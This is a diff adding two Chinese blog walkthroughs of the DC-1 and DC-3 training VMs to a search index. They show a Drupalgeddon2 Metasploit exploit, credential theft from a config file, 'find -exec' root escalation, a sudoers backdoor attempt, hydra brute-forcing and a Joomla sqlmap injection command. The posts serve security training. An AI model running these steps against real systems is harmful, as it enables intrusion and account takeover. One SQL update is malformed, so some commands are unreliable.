@@ -1,6 +1,1612 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>DC-1 靶机渗透</title>
+    <url>/DC-1/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#dc-1-靶机渗透">DC-1 靶机渗透</a><ul>
+<li><a href="#1渗透过程">1.渗透过程</a></li>
+<li><a href="#2重要信息">2.重要信息</a></li>
+<li><a href="#3-flag">3. flag</a></li>
+<li><a href="#__the_end__"><strong>THE_END</strong></a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+
+<h1><span id="dc-1-靶机渗透">DC-1 靶机渗透</span></h1><h2><span id="1渗透过程">1.渗透过程</span></h2><ul>
+<li><p>直接开始~~</p>
+</li>
+<li><p>IP发现 <code>netdiscover</code></p>
+</li>
+<li><p>找到一个ip为 <code>192.168.0.119</code>的机器</p>
+</li>
+<li><p>给他扫下端口 <code>nmap -sT T4 -v -p- 192.168.0.119 -oN /tmp/res.txt</code></p>
+</li>
+<li><p>结果如下</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.70 scan initiated Fri Apr 24 14:34:40 2020 as: nmap -sT -v -p- -oN /tmp/res.txt T4 192.168.0.119</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> T4 (223.82.248.117) [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.119</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">47675/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:D0:43:83 (VMware)</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line"><span class="comment"># Nmap done at Fri Apr 24 14:34:45 2020 -- 2 IP addresses (1 host up) scanned in 5.79 seconds</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>有个<code>rpcbind</code>没见过的百度了一下：</p>
+</li>
+<li><blockquote>
+<p>  RPC是远程过程调用（Remote Procedure Call）的缩写形式。SAP系统RPC调用的原理其实很简单，有一些类似于三层构架的C/S系统，第三方的客户程序通过接口调用SAP内部的标准或自定义函数，获得函数返回的数据进行处理后显示或打印。</p>
+</blockquote>
+</li>
+<li><p>接着就是用<code>nikto</code>扫描一下web服务</p>
+</li>
+<li><p>让他先扫描…</p>
+</li>
+<li><p>nikto扫描得到两个比较有用的地址</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.119/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 <span class="comment">#这个是phpinfo()</span></span><br><span class="line">http://192.168.0.119/xmlrpc.php <span class="comment">#这个只有这样一句话：XML-RPC server accepts POST requests only.</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>也不知道咋用啊。。。。</p>
+</li>
+<li><p>我们进浏览器看看</p>
+</li>
+<li><p>就是一个登录的页面？</p>
+</li>
+<li><p>用插件 <code>wappalyzer</code>看到web的框架是 <code>Drupal 7</code></p>
+</li>
+<li><p>先看看存不存在框架漏洞</p>
+</li>
+<li><p>直接启动我们的神器：<code>msfconsole</code> </p>
+</li>
+<li><p>搜索一下框架漏洞<code>search Drupal</code></p>
+</li>
+<li><p>找到好几个呢，我们直接使用最新的</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Name:</span><br><span class="line">	exploit/unix/webapp/drupal_drupalgeddon2       </span><br><span class="line">Disclosure Date:</span><br><span class="line">	2018-03-28       </span><br><span class="line">Rank:</span><br><span class="line">	excellent  </span><br><span class="line">Check:</span><br><span class="line">	Yes    </span><br><span class="line">Description：</span><br><span class="line">	Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">	(Drupal Drupalgeddon 2表单API属性注入)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>show options</code> 看看要什么参数，</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   RHOSTS                        yes       The target address range or CIDR </span><br><span class="line">   <span class="comment">#只要设置这个就能跑了</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>那就设置：<code>set RHOST 192.168.0.119</code></p>
+</li>
+<li><p>接着就是激动人心的时刻了: <code>exploit</code> </p>
+</li>
+<li><p>得到一个会话，成了~</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Sending stage (38247 bytes) to 192.168.0.119</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.21:4444 -&gt; 192.168.0.119:34430) at 2020-04-24 15:40:03 +0800</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获得标准shell</span></span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>ls</code> 一下，看到一个<code>flag1.txt</code>的文件</p>
+</li>
+<li><p><code>cat</code> 一下：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br><span class="line"><span class="comment">#每一个好的CMS都需要一个配置文件-你也是。</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找配置文件？不知道</p>
+</li>
+<li><p>百度去~ </p>
+</li>
+<li><p>找到是在<code>/var/www/sites/default/setting.php</code></p>
+</li>
+<li><p><code>cat</code> 一下</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren't the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> * 不是暴力和字典攻击</span></span><br><span class="line"><span class="comment"> * 只有获得访问权限的方法（而且您将需要访问权限）。</span></span><br><span class="line"><span class="comment"> * 你能用这些证件做什么？</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$databases = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'default'</span> =&gt;</span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'default'</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">'database'</span> =&gt; <span class="string">'drupaldb'</span>,</span><br><span class="line">      <span class="string">'username'</span> =&gt; <span class="string">'dbuser'</span>,</span><br><span class="line">      <span class="string">'password'</span> =&gt; <span class="string">'R0ck3t'</span>,</span><br><span class="line">      <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">      <span class="string">'port'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">      <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">      <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找到了flag2，还看到了数据库的账号密码</p>
+</li>
+<li><p>登录<code>mysql</code>看看</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们先看看有什么数据库</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.02 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>没有mysql库 <code>~_~||</code></p>
+</li>
+<li><p>那就进 <code>drupaldb</code>看看网站的登录密码吧~</p>
+</li>
+<li><p><code>use drupaldb</code> <code>show tables;</code></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| <span class="built_in">history</span>                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>好多表啊~~</p>
+</li>
+<li><p>有个 <code>users</code>我们查询一下</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select uid,name,pass from users;</span><br><span class="line">+-----+-------+---------------------------------------------------------+</span><br><span class="line">| uid | name  | pass                                                    |</span><br><span class="line">+-----+-------+---------------------------------------------------------+</span><br><span class="line">|   0 |       |                                                         |</span><br><span class="line">|   1 | admin | <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR |</span><br><span class="line">|   2 | Fred  | <span class="variable">$S</span><span class="variable">$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |</span><br><span class="line">+-----+-------+---------------------------------------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这后面是什么鬼密码？？</p>
+</li>
+<li><p>不是MD5，咋办<del>~</del></p>
+</li>
+<li><p>找官网搜索密码重置</p>
+</li>
+<li><p>最后在 <code>https://www.drupal.org/node/1023428</code> 找到相关方法</p>
+</li>
+<li><p>说执行 <code>./scripts/password-hash.sh newpwd</code>可以得到一个新密码</p>
+</li>
+<li><p>那我们把它admin用户的密码给改了</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./scripts/password-hash.sh 1234</span><br><span class="line">password: 1234          </span><br><span class="line"><span class="built_in">hash</span>: <span class="variable">$S</span><span class="variable">$DSM0f3PE7gij</span>.NOoFJC2nqT1A8.1M6hh5LHeeQ62d.ghV0I9yz6U</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进数据库给他改了</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">set</span> pass=<span class="string">'$S$DSM0f3PE7gij.NOoFJC2nqT1A8.1M6hh5LHeeQ62d.ghV0I9yz6U'</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> uid=<span class="number">1</span>;</span><br><span class="line">Query OK, 1 row affected (0.06 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>登录网站。点击上面的 <code>content</code></p>
+</li>
+<li><p>找到一篇 <code>flag3</code>的文章内容是：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Special PERMS will <span class="built_in">help</span> FIND the passwd - but you<span class="string">'ll need to -exec that command to work out how to get what'</span>s <span class="keyword">in</span> the shadow.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找到关键信息：<code>FIND -exec</code> 和 <code>shadow</code>；</p>
+</li>
+<li><p>那我们去看看 <code>/etc/shadow</code> 文件：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat: /etc/shadow: Permission denied</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>没有权限？</p>
+</li>
+<li><p>那 <code>/etc/passwd</code>呢？</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找到一个<code>flag4</code>的用户home目录在<code>/home/flag4</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /home/flag4</span><br><span class="line">flag4.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>有一个 <code>flag4.txt</code>我们试着读取一下</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /home/flag4/flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag <span class="keyword">in</span> root?</span><br><span class="line">Probably. But perhaps it<span class="string">'s not that easy.  Or maybe it is?</span></span><br><span class="line"><span class="string">您可以使用相同的方法在根目录中查找或访问标志吗？</span></span><br><span class="line"><span class="string">可能。但也许不是那么容易。或许是这样？</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在根目录查找？</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用find'随便查找一个文件 然后-exec 来启shell</span></span><br><span class="line">find ./ xxx -<span class="built_in">exec</span> <span class="string">'/bin/sh'</span> \;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>得到一个有root权限的shell</p>
+</li>
+<li><p><code>cd</code> 到<code>/root</code>下:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    <span class="comment"># 有一个thefinalflag.txt文件</span></span><br><span class="line">    cat thefinalflag.txt</span><br><span class="line">Well <span class="keyword">done</span>!!!!</span><br><span class="line">    Hopefully you<span class="string">'ve enjoyed this and learned some new skills.</span></span><br><span class="line"><span class="string">    You can let me know what you thought of this little journey</span></span><br><span class="line"><span class="string">    by contacting me via Twitter - @DCAU7</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>完成了~</p>
+</li>
+<li><p>给他留个用户吧~</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建一个可以登录的用户在root并设置密码</span></span><br><span class="line">useradd rex -m -s /bin/bash -d /home/rex -g root;passwd rex</span><br><span class="line"><span class="comment">#给他root权限</span></span><br><span class="line">chmod u+w /etc/sudoers;<span class="built_in">echo</span> <span class="string">'rex  	ALL=(ALL:ALL) ALL'</span> &gt;&gt; /etc/sudoers;chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>不料：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh: 20: useradd: not found <span class="comment">#没有useradd这个命令？</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>额嘿嘿，5个flag都拿到了，算了算了。</p>
+</li>
+<li><p>后来爆破了flag4的密码：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破密码：</span></span><br><span class="line">hydra -l flag4 -P /tmp/password.lst -t 5 ssh://192.168.0.119</span><br><span class="line"><span class="comment"># 密码字典在 /usr/share/john/password.lst</span></span><br><span class="line"><span class="comment"># 也可以自己定制</span></span><br></pre></td></tr></table></figure>
+
+<p>​    </p>
+<h2><span id="2重要信息">2.重要信息</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. mysql 账号密码：</span></span><br><span class="line">	user：dbuser passwd：R0ck3t</span><br><span class="line"><span class="comment">#2. ssh 的账号密码：</span></span><br><span class="line">	user：flag4 passwd orange</span><br></pre></td></tr></table></figure>
+
+<h2><span id="3-flag">3. flag</span></h2><ol>
+<li><pre><code class="js"># flag1
+# 在网站的目录下
+# 内容是：
+Every good CMS needs a config file - and so <span class="keyword">do</span> you.
+#每一个好的CMS都需要一个配置文件-你也是。
+&lt;!--￼<span class="number">25</span>--&gt;</code></pre>
+</li>
+<li><pre><code class="js"># flag3
+# 在网站登录后的content里面
+# 内容是：
+<span class="string">"Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow."</span>
+&lt;!--￼<span class="number">26</span>--&gt;</code></pre>
+</li>
+<li><pre><code class="js"># flag5
+# /root/thefinalflag.txt root用户目录下的thefinalflag.txt文件
+# 内容是：
+<span class="string">"Well done!!!!"</span>
+<span class="string">"Hopefully you've enjoyed this and learned some new skills."</span>
+<span class="string">"You can let me know what you thought of this little journey"</span>
+<span class="string">"by contacting me via Twitter - @DCAU7"</span>
+&lt;!--￼<span class="number">27</span>--&gt;
+</code></pre>
+</li>
+</ol>
+<h2><span id="the_end"><strong>THE_END</strong></span></h2>]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-3 靶机渗透</title>
+    <url>/DC-3/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#dc-3靶机渗透">DC-3靶机渗透</a><ul>
+<li><a href="#1-渗透过程">1. 渗透过程</a><ul>
+<li><a href="#welcome-to-dc-3">Welcome to DC-3.</a></li>
+<li><a href="#欢迎来到dc-3">欢迎来到DC-3。</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+
+<h1><span id="dc-3靶机渗透">DC-3靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul>
+<li>先发现主机</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># arp-scan 192.168.0.1/24</span></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:f9:47:54, IPv4: 192.168.0.21</span><br><span class="line">WARNING: host part of 192.168.0.1/24 is non-zero</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1     04:95:e6:0f:a2:10       Tenda Technology Co.,Ltd.Dongguan branch</span><br><span class="line">192.168.0.22    00:0c:29:a9:c5:31       VMware, Inc.</span><br><span class="line">192.168.0.109   dc:8b:28:00:fa:32       Intel Corporate</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>得到ip: <code>192.168.0.22</code></p>
+</li>
+<li><p>探测端口: </p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sT -v -p- 192.168.0.22</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-29 15:41 CST</span><br><span class="line">Initiating ARP Ping Scan at 15:41</span><br><span class="line">Scanning 192.168.0.22 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 15:41, 0.04s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 15:41</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 15:41, 0.03s elapsed</span><br><span class="line">Initiating Connect Scan at 15:41</span><br><span class="line">Scanning 192.168.0.22 [65535 ports]</span><br><span class="line">Discovered open port 80/tcp on 192.168.0.22</span><br><span class="line">Completed Connect Scan at 15:41, 1.90s elapsed (65535 total ports)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.22</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:A9:C5:31 (VMware)</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.18 seconds</span><br><span class="line">           Raw packets sent: 1 (28B) | Rcvd: 1 (28B)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>只有80端口</p>
+</li>
+<li><p>现进去看看</p>
+</li>
+<li><blockquote>
+<h3><span id="welcome-to-dc-3">Welcome to DC-3.</span></h3><p>  This time, there is only one flag, one entry point and no clues.</p>
+<p>  To get the flag, you’ll obviously have to gain root privileges.</p>
+<p>  How you get to be root is up to you - and, obviously, the system.</p>
+<p>  Good luck - and I hope you enjoy this little challenge. :-)</p>
+<h3><span id="欢迎来到dc-3">欢迎来到DC-3。</span></h3><p>  这次，只有一个flag，一个入口点，没有任何线索。</p>
+<p>  要获得标志，显然必须获得root权限。</p>
+<p>  你是如何成为根的取决于你-很明显，还有系统。</p>
+<p>  祝你好运-我希望你喜欢这个小挑战。:-)</p>
+</blockquote>
+</li>
+<li><p>只有一个入口点？</p>
+</li>
+<li><p>页面也有一个登陆框</p>
+</li>
+<li><p>八成是突破这个登录框了</p>
+</li>
+<li><p>想看看网站的信息：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># whatweb http://192.168.0.22/</span></span><br><span class="line">http://192.168.0.22/ [200 OK] Apache[2.4.18], Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[192.168.0.22], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>发现是Joomla框架</p>
+</li>
+<li><p>先扫描一下框架版本</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joomscan -u http://192.168.0.22/</span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing :</span><br><span class="line">http://192.168.0.22/administrator/components</span><br><span class="line">http://192.168.0.22/administrator/modules</span><br><span class="line">http://192.168.0.22/administrator/templates</span><br><span class="line">http://192.168.0.22/images/banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info/status files</span><br><span class="line">[++] Readable info/status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.0.22/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is not found</span><br><span class="line"></span><br><span class="line">[+] Finding common backup files name</span><br><span class="line">[++] Backup files are not found</span><br><span class="line"></span><br><span class="line">[+] Finding common <span class="built_in">log</span> files name</span><br><span class="line">[++] error <span class="built_in">log</span> is not found</span><br><span class="line"></span><br><span class="line">[+] Checking sensitive config.php.x file</span><br><span class="line">[++] Readable config files are not found</span><br><span class="line">Your Report : reports/192.168.0.22/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>发现版本：Joomla 3.7.0 和后台地址 <a href="http://192.168.0.22/administrator/" target="_blank" rel="noopener">http://192.168.0.22/administrator/</a></p>
+</li>
+<li><p>先看看有没有框架漏洞</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit Joomla 3.7.0</span></span><br><span class="line">----------------------------------------------------------------------------------- </span><br><span class="line">   			Exploit Title  					|  Path                                                             				| (/usr/share/exploitdb/)               </span><br><span class="line">----------------------------------------------------------------------------------- </span><br><span class="line">Joomla! 3.7.0 - <span class="string">'com_fields'</span> SQL Injection  | exploits/php/webapps/42033.txt       </span><br><span class="line">-----------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>有个sql注入</p>
+</li>
+<li><p>看看他注入点</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br><span class="line"></span><br><span class="line">Using Sqlmap:</span><br><span class="line">sqlmap -u <span class="string">"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>直接用sqlmap 跑就完了</li>
+</ul>
